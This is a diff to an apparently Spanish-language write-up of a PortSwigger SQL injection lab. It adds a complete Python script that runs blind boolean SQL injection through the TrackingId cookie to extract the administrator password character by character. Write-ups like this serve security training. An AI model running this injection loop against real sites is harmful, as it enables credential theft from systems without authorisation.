@@ -836,8 +836,55 @@ Esto es un poco cansado, probar letra por letra, y no solo pueden ser letras, ya
 
 Nuestro código terminado se ve así:
 
-![carbon](/assets/images/SQLiPortswigger/lab11/carbon.png)
+```py
+#!/usr/bin/python3
 
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+#CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "https://0a8a00dc03454998c09f90e700180095.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+def makeRequest():
+
+    password = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Password")
+
+    for position in range(1,21):
+
+        for character in characters:
+
+            cookies = {
+                'TrackingId': "EkppvYfQrcHQK79N' AND (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='administrator')='%s" % (position, character),
+                'session': '6Ditk4mK0zirtmo81PYSbUwnGni78Aqf'
+            }
+
+            p1.status(cookies['TrackingId'])
+
+            r = requests.get(main_url, cookies=cookies)
+
+            if "Welcome back!" in r.text:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == '__main__':
+
+    makeRequest()
+```
 La primera línea del código es esto:
 
 `#!/usr/bin/python3`
